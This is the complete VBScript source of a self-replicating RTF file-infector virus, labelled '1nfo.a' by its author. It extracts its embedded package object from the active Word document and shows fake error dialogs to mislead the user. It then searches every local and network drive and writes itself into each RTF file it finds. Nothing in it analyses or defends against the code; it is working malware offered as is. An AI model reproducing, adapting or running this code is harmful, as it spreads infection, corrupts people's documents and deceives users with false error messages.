'VOVAN//SMF - 1nfo.a RTF virus.
On Error Resume Next
Set A=CreateObject("Scripting.FileSystemObject")
M1="{\object\objemb"
M2="{\*\objclass Package}"
M3="}}}"
Set B=GetObject(,"Word.Application")
If B<>"" Then
C=B.ActiveDocument.FullName
Call Test_Infected(C,1,K)
End If
If K="" Then
MsgBox "Format of data is supported only by Microsoft Word",48,"Error"
WScript.Quit
End If
D=K
MsgBox "I/O Error",16,"MPLAYER.EXE"
Set E=A.Drives
For Each Drive In E
If Drive.DriveType=2 Or Drive.DriveType=3 Then Search Drive.Path &"\"
Next
Function Test_Infected(T,P,K)
K=""
If A.FileExists(T)=False Then Exit Function
Set F=A.OpenTextFile(T,1)
G=F.ReadAll
F.Close
H=Split(G,vbCrLf)
For I=0 To UBound(H) Step 1
J=H(I)+Chr(13)&Chr(10)
If InStr(J,M1)<>0 And InStr(J,M2)<>0 Then J=Mid(J,InStr(J,M1),Len(J)):L=True
If L=True Then
N=N+1
If (N=105 Or N=253) And L=True And InStr(H(I),M3)<>0 Then
If N=105 Then R=3 Else R=2
J=Left(H(I),InStr(H(I),M3)+R)
K=K+J
Q=True
Exit For
End If
K=K+J
End If
Next
If Q=True Then
If P=1 Or P=2 Then Exit Function
End If
If P=2 Then Infected(T)
End Function
Function Search(A7)
Set S=A.GetFolder(A7)
Set U=S.SubFolders
For Each V In U
Search(V)
Next
Set W=S.Files
For Each X In W
Y=A.GetExtensionName(X.Path)
If Y="rtf" Or Y="RTF" Then
Call Test_Infected(X.Path,2,0)
End If
Next
End Function
Sub Infected(Z)
Set O=A.OpenTextFile(Z,1)
A1=O.ReadAll
O.Close
H=Split(A1,vbCrLf)
For I=0 To UBound(H) Step 1
A2=H(I)
A3=A3+A2+Chr(13)&Chr(10)
If I=0 Then A3=A3+D+Chr(13)&Chr(10)
Next
Set A4=A.OpenTextFile(Z,2)
A4.Write A3
A4.Close
End Sub